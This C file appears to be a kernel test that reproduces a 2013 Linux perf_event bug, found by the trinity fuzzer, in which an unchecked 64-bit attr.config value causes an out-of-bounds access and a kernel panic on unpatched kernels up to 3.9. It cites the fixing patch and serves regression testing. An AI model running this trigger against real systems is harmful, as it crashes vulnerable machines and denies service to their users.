/* Reported by Tommi Rantala <tt.rantala@gmail.com> using trinity */
/* April 13th 2013 on linux-kernel */
/* Subject: Re: sw_perf_event_destroy() oops while fuzzing */

/* Trinity discovered that we fail to check all 64 bits of attr.config */
/* passed by user space, resulting to out-of-bounds access of the      */
/* perf_swevent_enabled array in sw_perf_event_destroy().              */

/* Introduced in commit b0a873ebb ("perf: Register PMU implementations"). */

/* Patch that fixes is:                                                */
/* [PATCH] perf: treat attr.config as u64 in perf_swevent_init()       */
/* vulnerable through 3.9                                              */


#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#include "perf_event.h"
#include "perf_helpers.h"

int main(void) {

   struct perf_event_attr pe;
   int fd;


   printf("On unpatched kernels this will cause a panic.\n\n");

   memset(&pe,0,sizeof(struct perf_event_attr));

   pe.type = PERF_TYPE_SOFTWARE;
   pe.size = sizeof(struct perf_event_attr);
   pe.config = 0x00000000ffffffffULL;
   //pe.config = PERF_COUNT_SW_CPU_CLOCK;

   fd=perf_event_open(&pe,0,-1,-1,0);
   if (fd>0) {
      printf("Unexpectedly able to open that.\n");
   }
   //printf("Return %d errno %d: %s\n",fd,errno,strerror(errno));

   return 0;
}
